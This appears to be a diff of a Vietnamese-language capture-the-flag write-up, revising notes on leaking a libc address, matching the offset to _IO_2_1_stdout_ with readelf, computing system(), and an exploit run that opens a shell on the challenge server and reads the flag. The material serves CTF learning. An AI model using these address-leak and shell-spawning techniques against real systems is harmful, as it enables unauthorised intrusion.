@@ -20,7 +20,7 @@ You: ok girl
 root@kali:~#
 ```
 
-Con này stripped rồi nên không dùng `gdb` để xem `main` được, dùng `objdump` hay cái gì đó khác nhé.
+Con này không dùng `gdb` để xem `main` được, dùng `objdump` hay cái gì đó khác nhé.
 > Radare2, IDA hay Binary Ninja...
 ```asm
 ...
@@ -170,14 +170,14 @@ Mapped address spaces:
   ...
   
 gdb-peda$ p/x 0xf7fadd80-0xf7dd3000
-$1 = 0x1dad80
+$1 = 0x1dad80 # <--- Thử tìm trong libc xem có phải là hàm không?
 gdb-peda$ quit
 root@kali:~# readelf -s /usr/lib32/libc-2.28.so | grep 1dad80
-   905: 001dad80   152 OBJECT  GLOBAL DEFAULT   31 _IO_2_1_stdout_@@GLIBC_2.1 # <--- :))
+   905: 001dad80   152 OBJECT  GLOBAL DEFAULT   31 _IO_2_1_stdout_@@GLIBC_2.1 # <--- Đúng là offset của hàm rồi :))
 root@kali:~#
 ```
-Rồi thế là biết 1 hàm trong libc, chạy nhiều lần thì nó vẫn ra hàm đấy thôi. Còn lưu ý nữa là con này biên dịch bằng `GCC 7.3.0` cho nên việc tính ra `system` có thể bị sai,
-vì kali của mình đang chạy `GCC 8.3.0`, chuyển qua ubuntu cho chắc:
+Rồi thế là biết 1 hàm trong libc. Lưu ý: con này biên dịch bằng `GCC 7.3.0` cho nên việc tính ra địa chỉ `system` có thể bị sai,
+vì Kali của mình đang chạy `GCC 8.3.0`, chuyển qua Ubuntu cho chắc:
 ```bash
 zeltrax@z-pc:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep stdout
    783: 001d8ea0    80 OBJECT  GLOBAL DEFAULT   34 _IO_stdout_@@GLIBC_2.0
@@ -219,20 +219,19 @@ p.interactive()
 ```
 Nhớ flag fake không? Phải là flag2 cơ :grin:
 ```bash
+zeltrax@z-pc:~$ python pz.py 
 [+] Opening connection to 3.91.78.13 on port 10001: Done
 Pwn: Oh? You're approaching me? Instead of running away, you're coming right to me?
 
 You: 
 [You said: AAAAAAAAAAAAAAAA
-random: 0xc09dc5bd
-$ebp-0x8: 0xf7ecdd80
-system: 0xf7d32200
-]
-
-Pwn: 
+random: 0x4c91405a
+$ebp-0x8: 0xf7f39d80
+system: 0xf7d9e200
+[']', 'Pwn: Oh ho... then come as close as you want']
+You: 
 [*] Switching to interactive mode
-Oh ho... then come as close as you want
-You: $ cat flag2
+$ cat flag2
 PTITCTF{w3ll_y3s_0utst4nd1ng_m0v3_but_1t's_ill3g4l}
-$ 
+$  
 ```
